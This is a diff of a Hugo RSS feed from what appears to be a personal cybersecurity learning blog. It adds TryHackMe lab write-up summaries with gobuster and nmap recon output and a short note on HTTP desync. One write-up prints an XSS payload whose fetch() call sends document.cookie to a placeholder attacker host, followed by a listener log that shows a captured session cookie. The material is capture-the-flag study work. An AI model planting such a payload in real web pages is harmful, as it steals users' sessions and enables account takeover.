@@ -6,7 +6,325 @@
     <description>Recent content in Note on Cyber Blog-ul lui Novac</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>ro-ro</language>
-    <lastBuildDate>Tue, 10 Nov 2026 10:01:40 +0000</lastBuildDate><atom:link href="https://novaclearnscyber.github.io/blog/tags/note/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 26 Nov 2026 11:03:55 +0000</lastBuildDate><atom:link href="https://novaclearnscyber.github.io/blog/tags/note/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>mp3</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/mp3/</link>
+      <pubDate>Thu, 26 Nov 2026 11:03:55 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/mp3/</guid>
+      
+      <description>&lt;p&gt;link : &lt;a href=&#34;https://tryhackme.com/room/convertmyvideo&#34;&gt;https://tryhackme.com/room/convertmyvideo&lt;/a&gt;&lt;br&gt;
+recon&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─ gobuster dir -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://10.112.158.22/&amp;#39;&lt;/span&gt; -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Gobuster v3.8.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;by OJ Reeves &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@firefart&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Url:                     http://10.112.158.22/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Method:                  GET
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Threads:                 &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Negative Status codes:   &lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User Agent:              gobuster/3.8.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Timeout:                 10s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting gobuster in directory enumeration mode
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;images               &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 315&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.112.158.22/images/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;admin                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 401&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 460&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;js                   &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 311&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.112.158.22/js/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tmp                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 312&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.112.158.22/tmp/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Progress: &lt;span style=&#34;color:#ae81ff&#34;&gt;43990&lt;/span&gt; / &lt;span style=&#34;color:#ae81ff&#34;&gt;220558&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;19.94%&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;ERROR&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; error on word aer: timeout occurred during the request
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;server-status        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 278&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Progress: &lt;span style=&#34;color:#ae81ff&#34;&gt;189094&lt;/span&gt; / &lt;span style=&#34;color:#ae81ff&#34;&gt;220557&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;85.73%&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;^C
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ports opened :&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>ConvertMyVideo</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/convertmyvideo/</link>
+      <pubDate>Wed, 25 Nov 2026 09:33:00 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/convertmyvideo/</guid>
+      
+      <description>&lt;p&gt;link : &lt;a href=&#34;https://tryhackme.com/room/convertmyvideo&#34;&gt;https://tryhackme.com/room/convertmyvideo&lt;/a&gt;&lt;br&gt;
+recon&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─ gobuster dir -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://10.112.158.22/&amp;#39;&lt;/span&gt; -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Gobuster v3.8.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;by OJ Reeves &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@firefart&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Url:                     http://10.112.158.22/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Method:                  GET
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Threads:                 &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Negative Status codes:   &lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User Agent:              gobuster/3.8.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Timeout:                 10s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting gobuster in directory enumeration mode
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;images               &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 315&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.112.158.22/images/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;admin                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 401&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 460&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;js                   &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 311&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.112.158.22/js/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tmp                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 312&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.112.158.22/tmp/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Progress: &lt;span style=&#34;color:#ae81ff&#34;&gt;43990&lt;/span&gt; / &lt;span style=&#34;color:#ae81ff&#34;&gt;220558&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;19.94%&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;ERROR&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; error on word aer: timeout occurred during the request
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;server-status        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 278&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Progress: &lt;span style=&#34;color:#ae81ff&#34;&gt;189094&lt;/span&gt; / &lt;span style=&#34;color:#ae81ff&#34;&gt;220557&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;85.73%&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;^C
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ports opened :&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>EL BANDITO</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/el-bandito/</link>
+      <pubDate>Tue, 24 Nov 2026 10:42:49 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/el-bandito/</guid>
+      
+      <description>&lt;p&gt;this machine is not working correctly , thanks thm&lt;/p&gt;
+&lt;p&gt;recon:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─ nmap $IP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.99 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2026-11-24 12:44 +0200
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.114.133.11
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;996&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;reset&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT     STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp   open  ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp   open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;631/tcp  open  ipp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8080/tcp open  http-proxy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 4.00 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;ipp = The Internet Printing Protocol is a specialized communication protocol used between client devices and printers. The protocol allows clients to submit one or more print jobs to the printer or print server attached via network or USB, and perform tasks such as querying the status of a printer,&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>HTTP browser desync</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/http-browser-desync/</link>
+      <pubDate>Tue, 24 Nov 2026 09:57:02 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/http-browser-desync/</guid>
+      
+      <description>&lt;h4 id=&#34;httpkeep-alive&#34;&gt;HTTP Keep-Alive&lt;/h4&gt;
+&lt;p&gt;HTTP keep-alive is a mechanism that allows the reuse of a single TCP connection for multiple HTTP requests and responses. It helps reduce latency and improve performance by avoiding the need to open and close connections repeatedly. However, it can introduce a security risk known as Cache Poisoning. If caching mechanisms are in place, the persistence of connections through keep-alive could contribute to cache poisoning attacks. An attacker might exploit desynchronization issues to store malicious content in caches.&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>writeup</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/writeup/</link>
+      <pubDate>Tue, 17 Nov 2026 09:15:54 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/writeup/</guid>
+      
+      <description>&lt;p&gt;add the site to /etc/hosts&lt;br&gt;
+go to the web server , register&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261117102926.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261117103548.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;users.verified&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://YOUT_IP:81?cookie=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;btoa&lt;/span&gt;(document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;),{&lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;});&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;php -S 0.0.0.0:81&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Tue Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 10:41:23 2026&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; PHP 8.4.24 Development Server &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;http://0.0.0.0:81&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; started
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Tue Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 10:44:03 2026&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.114.178.183:42640 Accepted
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Tue Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 10:44:03 2026&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.114.178.183:42640 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;200&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: GET /?cookie&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;UEhQU0VTU0lEPTlhN2xuYzI1ZTJidDNpYTZlZmtmZWs4MjJv
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Tue Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 10:44:03 2026&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.114.178.183:42640 Closing
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261117104733.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261117105336.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261117105439.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261117105601.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>what your  name - THM</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/what-your--name---thm/</link>
+      <pubDate>Tue, 17 Nov 2026 08:21:05 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/what-your--name---thm/</guid>
+      
+      <description>&lt;p&gt;link:https://tryhackme.com/room/whatsyourname&lt;br&gt;
+i will skip recon this time because the scope of room is implicit csrf and xss&lt;br&gt;
+add the site to /etc/hosts&lt;br&gt;
+go to the web server, register&lt;/p&gt;
